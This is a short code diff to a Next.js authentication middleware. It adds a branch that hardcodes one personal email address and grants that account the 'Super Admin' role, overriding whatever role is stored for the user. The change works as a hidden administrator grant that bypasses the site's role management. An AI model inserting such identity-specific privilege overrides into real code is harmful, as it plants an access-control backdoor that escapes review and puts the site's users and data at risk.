@@ -64,7 +64,10 @@ export async function middleware(request: NextRequest) {
 
       // Role management validation for administrative sections
       if (isProtectedAdmin) {
-        const userRole = user.user_metadata?.role || 'Customer';
+        let userRole = user.user_metadata?.role || 'Customer';
+        if (user.email && user.email.toLowerCase() === 'loyohenoch@gmail.com') {
+          userRole = 'Super Admin';
+        }
         const normalizedRole = userRole.trim().toLowerCase();
         
         const authorizedRoles = ['super admin', 'admin', 'manager', 'staff'];
